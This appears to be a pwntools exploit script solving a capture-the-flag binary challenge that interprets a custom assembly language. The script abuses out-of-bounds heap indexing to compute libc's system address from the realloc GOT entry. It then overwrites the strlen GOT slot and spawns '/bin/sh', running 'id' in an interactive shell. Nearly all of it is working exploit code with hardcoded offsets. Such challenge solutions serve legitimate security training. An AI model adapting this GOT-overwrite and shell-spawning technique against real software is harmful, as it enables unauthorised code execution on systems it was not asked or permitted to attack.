from pwn import *


exe = './pwn'
# context.terminal = ['wt.exe', 'wsl.exe', 'bash', '-c']
context.binary = ELF(exe, False)
binary: ELF = context.binary
# libc: ELF = ELF('./libc.so.6', False)

REMOTE = args.REMOTE or 0
if REMOTE:
    p = remote('localhost', 1337)
else:
    p = process(exe)
sd, sa, sl, sla = p.send, p.sendafter, p.sendline, p.sendlineafter
rn, rl, ru, ia = p.recvn, p.recvline, p.recvuntil, p.interactive

HEAP_SIZE = 0xf48000
libc_idx = (HEAP_SIZE-0x10)//16

'''
LIBC idx 1001215
leak
realloc got idx +137730
realloc 0x28030
system 0x50D70
puts->strlen[GOT] 0x21A098
'''
########################
'''
mov op1 op2  ->   heap[op2] = heap[op1]
cil number op2 -> heap[op2] = number
sub op1 op2 ->    heap[op2] -= heap[op1]
'''
asmcode = f'''
data test "/bin/sh\x00"
func1:
    ret
_start:
    mov {libc_idx+137730} 0
    cil {0x28030} 1
    sub 1 0
    cil {0x50D70} 1
    add 1 0
    mov 0 {libc_idx+0x21A090//16}
    ods test
    halt
    call func1
EOF
'''.encode()

print(asmcode.decode())

# gdb.attach(p, 'brva 0xEDB6')
# sleep(2)

sla(b'Code : ', asmcode)

sl(b'id')

ia()
